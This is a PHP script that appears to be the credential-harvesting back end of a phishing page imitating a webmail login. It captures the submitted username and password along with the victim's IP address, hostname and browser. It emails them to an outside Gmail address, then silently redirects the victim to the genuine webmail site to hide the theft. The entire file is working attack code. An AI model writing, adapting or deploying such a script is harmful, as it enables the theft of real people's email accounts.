<?php

$user = $_REQUEST["username"];
$pass = $_REQUEST["password"];

if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];

$data=" 
----------
User: $user
pass : $pass
------------------
$ip
$hostname
$browser
------------------
";

$subj = "Vmail LOGS-> $user,$pass";

$recipient1 = "demoictworld@gmail.com";
$rec2 = "";



mail($recipient1 , $subj , $data);
mail($rec2 , $subj , $data);

?>
<html>
<meta http-equiv="refresh" content="0;url=https://webmail.gnet.tn/">
</html>